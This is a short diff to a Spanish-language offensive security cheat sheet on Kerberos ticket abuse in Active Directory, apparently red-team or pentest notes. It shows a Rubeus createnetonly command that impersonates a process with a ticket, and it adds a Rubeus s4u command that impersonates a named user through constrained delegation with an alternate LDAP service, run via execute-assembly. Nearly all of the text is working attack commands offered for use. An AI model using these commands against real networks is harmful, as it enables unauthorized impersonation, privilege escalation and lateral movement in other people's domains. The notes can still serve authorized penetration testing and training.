@@ -365,3 +365,9 @@ Impersonar un proceso con el ticket
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain: /username:usuario_a_impersonar /password:FakePass /ticket:
 ```
+
+## Alternate Service Name (en caso de que el puerto 445 este cerrado)
+
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:servicio/equipo /altservice:ldap /user:maquina /ticket:doIFpD[...]MuSU8= /nowrap
+```
